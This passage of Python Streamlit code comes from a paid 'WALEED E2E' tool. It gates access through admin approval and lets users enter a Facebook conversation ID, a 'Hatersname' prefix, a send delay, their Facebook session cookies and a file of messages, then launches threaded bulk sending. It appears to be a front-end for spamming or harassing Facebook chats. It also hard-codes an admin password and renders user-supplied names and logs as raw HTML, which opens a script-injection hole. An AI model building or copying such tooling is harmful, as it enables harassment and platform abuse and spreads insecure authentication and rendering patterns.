    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# =============== MAIN APPLICATION UI ===============
st.markdown('<div class="premium-container">', unsafe_allow_html=True)

# Premium Header
st.markdown("""
<div class="premium-header">
    <div class="logo-container">
        <div class="logo-glow"></div>
        <div class="logo-icon"></div>
    </div>
    <h1 class="premium-title">WALEED E2E PAID TOOL</h1>
    <div class="premium-subtitle">PREMIUM AUTOMATION SUITE</div>
    <div class="premium-badge">VERSION 3.0 • PREMIUM EDITION</div>
</div>
""", unsafe_allow_html=True)

# Admin Panel
if st.sidebar.checkbox("🔐 Admin Login"):
    with st.sidebar.container():
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        admin_username = st.text_input("Admin Username", key="admin_username")
        admin_password = st.text_input("Admin Password", type="password", key="admin_password")
        
        if st.button("Login as Admin", use_container_width=True):
            if admin_username == "WALEED" and admin_password == "WALEED_XD":
                st.session_state.admin_logged_in = True
                st.success("✅ Admin login successful!")
                st.rerun()
            else:
                st.error("❌ Invalid admin credentials!")
        st.markdown('</div>', unsafe_allow_html=True)

if st.session_state.admin_logged_in:
    st.markdown('<div class="admin-panel">', unsafe_allow_html=True)
    st.markdown("### 👑 Admin Approval Panel")
    
    # LOGOUT BUTTON
    if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
        st.session_state.admin_logged_in = False
        st.rerun()
    
    # Get all pending approvals
    pending_users = db.get_pending_approvals()
    
    if pending_users:
        st.markdown(f"#### 📋 Pending Approvals ({len(pending_users)})")
        
        for user in pending_users:
            user_id, username, approval_key, real_name = user
            
            with st.container():
                col1, col2, col3 = st.columns([3, 1, 1])
                
                with col1:
                    st.markdown(f"""
                    <div class="user-card pending">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"✅ Approve", key=f"approve_{user_id}"):
                        db.update_approval_status(user_id, 'approved')
                        st.success(f"✅ Approved user: {username}")
                        st.rerun()
                
                with col3:
                    if st.button(f"❌ Reject", key=f"reject_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        st.error(f"❌ Rejected user: {username}")
                        st.rerun()
    
    # Show all approved users
    approved_users = db.get_approved_users()
    if approved_users:
        st.markdown("#### 🟢 Approved Users")
        
        for user in approved_users:
            user_id, username, approval_key, real_name, automation_running = user
            
            with st.container():
                col1, col2, col3, col4, col5 = st.columns([3, 1, 1, 1, 1])
                
                with col1:
                    user_config = db.get_user_config(user_id)
                    chat_id = user_config['chat_id'] if user_config else "Not configured"
                    status = "🟢 Running" if automation_running else "🔴 Stopped"
                    
                    st.markdown(f"""
                    <div class="user-card approved">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>💬 Chat ID:</strong> {chat_id}<br>
                        <strong>⚡ Status:</strong> {status}<br>
                        <strong>🔑 Key:</strong> <code>{approval_key[:8]}...</code>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        db.set_automation_running(user_id, False)
                        st.error(f"🗑️ Removed approval for: {username}")
                        st.rerun()
                
                with col3:
                    if automation_running:
                        if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
                            db.set_automation_running(user_id, False)
                            st.warning(f"⏹️ Stopped automation for: {username}")
                            st.rerun()
                    else:
                        if st.button(f"▶️ Start", key=f"start_{user_id}"):
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                db.set_automation_running(user_id, True)
                                thread = threading.Thread(
                                    target=run_automation_with_notification, 
                                    args=(user_config, username, AutomationState(), user_id)
                                )
                                thread.daemon = True
                                thread.start()
                                st.success(f"▶️ Started automation for: {username}")
                                st.rerun()
                            else:
                                st.error("⚠️ User needs to configure chat ID first")
    
    st.markdown('</div>', unsafe_allow_html=True)

elif not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
    
    with tab1:
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown("### Welcome Back!")
        
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    approval_status = db.get_approval_status(user_id)
                    
                    if approval_status == 'approved':
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = 'approved'
                        
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start and not st.session_state.automation_state.running:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                        
                        st.success(f"✅ Welcome back, {username}!")
                        st.rerun()
                    else:
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = approval_status or 'pending'
                        
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        st.rerun()
                else:
                    st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password")
        st.markdown('</div>', unsafe_allow_html=True)
    
    with tab2:
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown("### Create New Account")
        
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    result = db.create_user(new_username, new_password)
                    
                    if isinstance(result, tuple) and len(result) >= 2:
                        success, message = result[0], result[1]
                        user_id = result[2] if len(result) > 2 else None
                    else:
                        success = result if isinstance(result, bool) else False
                        message = "User creation completed" if success else "User creation failed"
                        user_id = None
                    
                    if success:
                        if user_id:
                            approval_key = generate_approval_key(new_username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.success(f"✅ {message} Please login now!")
                    else:
                        st.error(f"❌ {message}")
                else:
                    st.error("❌ Passwords do not match!")
            else:
                st.warning("⚠️ Please fill all fields")
        st.markdown('</div>', unsafe_allow_html=True)

else:
    # User is logged in but needs approval
    if st.session_state.approval_status != 'approved':
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown("### 🔒 Approval Required")
        
        st.markdown(f"""
        <div style="background: rgba(30, 41, 59, 0.7); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
            <h4>👤 User Information</h4>
            <p><strong>Username:</strong> {st.session_state.username}</p>
            <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
        </div>
        """, unsafe_allow_html=True)
        
        st.markdown(f"""
        <div style="background: rgba(30, 41, 59, 0.8); padding: 20px; border-radius: 12px; margin: 20px 0; text-align: center; border: 2px solid #3b82f6;">
            <h4>🔑 Your Approval Key</h4>
            <div style="font-size: 1.5rem; font-weight: bold; letter-spacing: 2px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #3b82f6;">
                {st.session_state.approval_key}
            </div>
            <button style="background: #3b82f6; color: white; border: none; border-radius: 8px; padding: 10px 20px; cursor: pointer;" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
        </div>
        """, unsafe_allow_html=True)
        
        st.markdown("### 📝 Enter Your Real Name")
        user_real_name = st.text_input("Your Real Name", key="real_name", placeholder="Enter your real name for approval", 
                                      value=st.session_state.user_real_name)
        
        if user_real_name:
            st.session_state.user_real_name = user_real_name
            db.update_user_real_name(st.session_state.user_id, user_real_name)
        
        if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
            if st.session_state.user_real_name:
                st.success("✅ Approval request ready! Use the contact buttons below to send it.")
            else:
                st.warning("⚠️ Please enter your real name first")
        
        st.markdown("### 📞 Contact Waleed Khan for Approval")
        col1, col2, col3 = st.columns(3)
        
        with col1:
            whatsapp_url = send_approval_request_via_whatsapp(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{whatsapp_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #25D366, #128C7E); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">📱 WhatsApp</a>', unsafe_allow_html=True)
        
        with col2:
            facebook_url = send_approval_request_via_facebook(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{facebook_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #1877F2, #0D5CB6); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">👤 Facebook</a>', unsafe_allow_html=True)
        
        with col3:
            telegram_url = send_approval_request_via_telegram(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{telegram_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #0088cc, #006699); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
        
        if st.button("🔄 Check Approval Status", use_container_width=True):
            current_status = db.get_approval_status(st.session_state.user_id)
            st.session_state.approval_status = current_status
            
            if current_status == 'approved':
                st.success("🎉 Your account has been approved! You can now access the automation features.")
                st.rerun()
            else:
                st.warning("⏳ Your approval is still pending. Please wait for Waleed to approve your request.")
        
        if st.sidebar.button("🚪 Logout"):
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.rerun()
        
        st.markdown('</div>', unsafe_allow_html=True)
    
    else:
        # User is approved and can access automation
        if not st.session_state.auto_start_checked and st.session_state.user_id:
            st.session_state.auto_start_checked = True
            should_auto_start = db.get_automation_running(st.session_state.user_id)
            if should_auto_start and not st.session_state.automation_state.running:
                user_config = db.get_user_config(st.session_state.user_id)
                if user_config and user_config['chat_id']:
                    start_automation(user_config, st.session_state.user_id)
        
        st.sidebar.markdown(f"### 👤 {st.session_state.username}")
        st.sidebar.markdown(f"**Status:** <span class='status-badge status-approved'>✅ Approved</span>", unsafe_allow_html=True)
        st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
        
        if st.sidebar.button("🚪 Logout", use_container_width=True):
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.rerun()
        
        user_config = db.get_user_config(st.session_state.user_id)
        
        if user_config:
            tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
            
            with tab1:
                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
                st.markdown("### Your Configuration")
                
                chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'], 
                                       placeholder="e.g., 1362400298935018 (Facebook conversation ID from URL)")
                
                name_prefix = st.text_input("Hatersname Prefix", value=user_config['name_prefix'],
                                           placeholder="e.g., [END TO END WALEED HERE]")
                
                delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
                                       value=user_config['delay'])
                
                cookies = st.text_area("Facebook Cookies (optional)", 
                                      value="",
                                      placeholder="Paste your Facebook cookies here (encrypted and private)",
                                      height=100)
                
                uploaded_file = st.file_uploader("Messages File Upload", type=['txt'])
                
                if uploaded_file is not None:
                    messages_content = uploaded_file.getvalue().decode("utf-8")
                else:
                    messages_content = user_config.get('messages_file_content', '')
                
                if st.button("💾 Save Configuration", use_container_width=True):
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(
                        st.session_state.user_id,
                        chat_id,
                        name_prefix,
                        delay,
                        final_cookies,
                        messages_content
                    )
                    st.success("✅ Configuration saved successfully!")
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)
            
            with tab2:
                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
                st.markdown("### Automation Control")
                
                col1, col2, col3 = st.columns(3)
                
                with col1:
                    st.markdown("""
                    <div class="metric-card">
                        <div class="metric-value">{}</div>
                        <div class="metric-label">Messages Sent</div>
                    </div>
                    """.format(st.session_state.automation_state.message_count), unsafe_allow_html=True)
                
                with col2:
                    status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                    st.markdown(f"""
                    <div class="metric-card">
                        <div class="metric-value">{status}</div>
                        <div class="metric-label">Status</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col3:
                    st.markdown("""
                    <div class="metric-card">
                        <div class="metric-value">{}</div>
                        <div class="metric-label">Total Logs</div>
                    </div>
                    """.format(len(st.session_state.automation_state.logs)), unsafe_allow_html=True)
                
                col1, col2 = st.columns(2)
                
                with col1:
                    if st.button("▶️ Start E2EE", disabled=st.session_state.automation_state.running, use_container_width=True):
                        current_config = db.get_user_config(st.session_state.user_id)
                        if current_config and current_config['chat_id']:
                            start_automation(current_config, st.session_state.user_id)
                            st.rerun()
                        else:
                            st.error("⚠️ Please configure Chat ID first!")
                
                with col2:
                    if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
                        stop_automation(st.session_state.user_id)
                        st.rerun()
                
                st.markdown("### 📜 Live Logs")
                
                if st.session_state.automation_state.logs:
                    logs_html = '<div class="log-console">'
                    for log in st.session_state.automation_state.logs[-30:]:
                        logs_html += f'<div class="log-entry">{log}</div>'
                    logs_html += '</div>'
                    st.markdown(logs_html, unsafe_allow_html=True)
                else:
                    st.info("📝 No logs yet. Start automation to see logs here.")
                
                if st.session_state.automation_state.running:
                    time.sleep(1)
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)

# Premium Footer
st.markdown("""
<div class="premium-footer">
    <div style="font-size: 1.2rem; font-weight: bold; color: white; margin-bottom: 10px;">WALEED E2E PAID TOOL</div>
    <p>Premium Automation Suite • Version 3.0</p>
    <p>© 2025 Waleed XD • All Rights Reserved</p>
</div>
""", unsafe_allow_html=True)

st.markdown('</div>', unsafe_allow_html=True)  # Close premium-container
